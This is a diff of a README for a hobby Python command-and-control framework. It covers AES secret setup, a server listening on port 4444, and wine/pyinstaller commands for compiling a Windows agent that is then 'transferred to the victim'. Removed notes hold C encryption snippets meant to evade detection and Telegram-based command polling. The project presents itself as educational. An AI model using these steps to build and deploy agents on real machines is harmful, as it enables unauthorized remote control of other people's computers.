@@ -1,77 +1,66 @@
+# G-r00t C2 project
+
+## Disclaimer
+
+This Command and Control (C2) tool is developed solely for educational and research purposes. It is intended to help users understand the principles of C2 communication, cybersecurity testing, and network security in a controlled and lawful environment.
+
+### Usage Policy
+
+This tool is strictly for learning and authorized testing purposes only.
+Unauthorized use against any system, network, or individual without explicit permission is illegal and strictly prohibited.
+
+The author does not condone, endorse, or support any malicious activities. Misuse of this tool to target networks, systems, or devices without consent may result in legal consequences. The author and contributors assume no responsibility for any damages or legal issues caused by misuse.
+Responsible Usage
+
+By using this tool, you agree to use it responsibly and legally within the bounds of ethical hacking, training, or research in a controlled environment.
+
+## Encryption setup
+
+This C2 framework uses AES encryption for communication.
+The first step is to generate the secrets (key and IV) and add them to the agent and sevrer python script. 
+To generate the secrets you can use the provided secretsGenerator.py script. 
+
+Once the secrets are generated you will need to add them to agent.py and server.py
+
+## Server
+
+The server by default lsiten to 0.0.0.0:4444.
+You can change this in the variables host and port.
+Once done you can just run it with python.
+
+## Agent cross-compiling 
+
+To crosscompile the agent for Windows I used wine. 
+You can follow this guide to setup Python and pyinstaller in wine: 
+
+https://www.makeworld.space/2021/10/linux-wine-pyinstaller.html
+
+Once the environment in wine is setup you will need to install the requirements:
+
+```
+wine C:/path/to/python.exe -m pip install -r requirements.txt
+```
+
+To compile the agent you can run:
+
+```
+wine C:/path/to/Scripts/pyinstaller.exe --onefile --add-binary "C:/path//to/python38.dll;." --name agent agent.py
+```
+
+Once the agent is compiled, you will find the executable in the dist/ folder.  
+You can now transfer it to the victim and use it by specifying the IP and PORT of the server:
+
+```
+agent.py <SERVER_IP> <SERVER_PORT>
+```
+
+
+
 ## To do list:
 
 **Helper**
 https://chatgpt.com/share/6733b8ee-d4ac-8000-8573-da71ae7c6e1d
 
-## Step 1: Setting Up Core C2 Functionality in C
-
-    Start with Basic Agent-Server Communication:
-        Implement basic HTTP communication between the C2 agent and server.
-        Use libcurl for HTTP requests if you're working in C, as it’s lightweight and supports SSL/TLS, which is helpful for encrypted channels.
-        Alternatively, you can build a custom socket-based protocol over TCP for more control, though this will require handling SSL/TLS directly or adding your own encryption layer.
-
-    Implement Agent Check-ins:
-        Write a function that checks in with the C2 server at regular intervals, requesting commands.
-        Start with plaintext communication for simplicity, and then layer encryption on top once you have basic functionality.
-
-## Step 2: Adding Encryption with AES and RSA
-
-Encryption is essential for C2 frameworks to avoid detection and secure data in transit. Here’s how to approach it in C:
-
-    Select an Encryption Library:
-        OpenSSL: Offers a robust implementation of both AES and RSA. It’s well-documented and widely used, making it a good choice for both symmetric and asymmetric encryption.
-        Libsodium: Known for being easier to use than OpenSSL, especially for key management and symmetric encryption.
-
-    Implementing AES for Command Encryption:
-        Use AES (Advanced Encryption Standard) for encrypting/decrypting command payloads between the server and agent.
-        Generate a session key on the agent side, and encrypt it using RSA, then send it to the server securely. Once established, use AES for further communications.
-
-    Example Workflow:
-        Generate a 256-bit AES key on the agent.
-        Encrypt the AES key with the server’s public RSA key.
-        The server decrypts this with its private key, establishing a shared AES session key for symmetric encryption.
-
-    AES Encryption Code in C: Here’s a basic example of AES encryption using OpenSSL’s library:
-
-#include <openssl/aes.h>
-#include <string.h>
-
-void aes_encrypt(const unsigned char *key, const unsigned char *plaintext, unsigned char *ciphertext) {
-    AES_KEY encrypt_key;
-    AES_set_encrypt_key(key, 256, &encrypt_key);
-    AES_encrypt(plaintext, ciphertext, &encrypt_key);
-}
-
-void aes_decrypt(const unsigned char *key, const unsigned char *ciphertext, unsigned char *plaintext) {
-    AES_KEY decrypt_key;
-    AES_set_decrypt_key(key, 256, &decrypt_key);
-    AES_decrypt(ciphertext, plaintext, &decrypt_key);
-}
-
-    Key Management: Store keys securely in memory and overwrite them after use to reduce exposure.
-    Padding: AES requires fixed-size blocks, so use padding to ensure data aligns with the AES block size (typically 128 bits or 16 bytes).
-
-Implementing RSA for Key Exchange:
-
-    Use RSA to securely share the AES session key. This can be implemented with OpenSSL as well.
-    RSA is asymmetric, meaning you’ll use the server’s public key to encrypt the AES key, and the server will use its private key to decrypt it.
-
-Example of RSA Encryption:
-
-    #include <openssl/rsa.h>
-    #include <openssl/pem.h>
-
-    int rsa_encrypt(const unsigned char *message, const char *public_key_file, unsigned char *encrypted) {
-        FILE *fp = fopen(public_key_file, "rb");
-        RSA *rsa = PEM_read_RSA_PUBKEY(fp, NULL, NULL, NULL);
-        int result = RSA_public_encrypt(strlen(message), message, encrypted, rsa, RSA_PKCS1_OAEP_PADDING);
-        RSA_free(rsa);
-        fclose(fp);
-        return result;
-    }
-
-        Store the server’s public key on the agent securely or include it at compile time.
-        The server decrypts this AES key using its private key, establishing a secure session.
 
 ## Step 3: Integrate pinggy and Test Encrypted Communication
 
@@ -99,12 +88,6 @@ Example Workflow for Telegram Integration
     Receive Responses via Telegram:
         Alternatively, for a pure C setup, use Telegram’s getUpdates endpoint via HTTP requests to poll for messages from the bot, then execute these commands in your C agent.
 
+## Extra functionalities
 
-
-## Change in plan
-
-I will use python. To create the server with a .exe I can use wine, but dlls need to be included in the file:
-
-wine C:/Python38/Scripts/pyinstaller.exe --onefile --add-binary "C:/Python38/python38.dll;." --log-level=DEBUG agent.py
-
-The filw will be in the dist/ folder
+Upload download files sunctionalities
